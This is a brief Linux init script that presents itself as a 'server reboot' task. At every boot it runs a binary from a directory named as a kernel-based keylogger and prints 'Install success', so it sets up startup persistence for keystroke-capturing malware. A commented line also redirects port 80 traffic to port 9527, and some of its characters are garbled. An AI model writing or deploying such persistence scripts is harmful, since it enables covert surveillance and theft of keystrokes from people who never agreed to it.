#!/bin/sh
#chkconfig: 2345 97 00
#description:Server reboot.Execute auto.sh

#client post port 80 redirect 9527
#sudo iptables -A PREROUTING -t nat -i eth0 -p tcp ��dport 80 -j REDIRECT ��to-port 9527

#auto.sh log
DIR=./linux-nice
cd /kernel-based-keylogger-for-Linux-master
./test1225
echo "Install success"
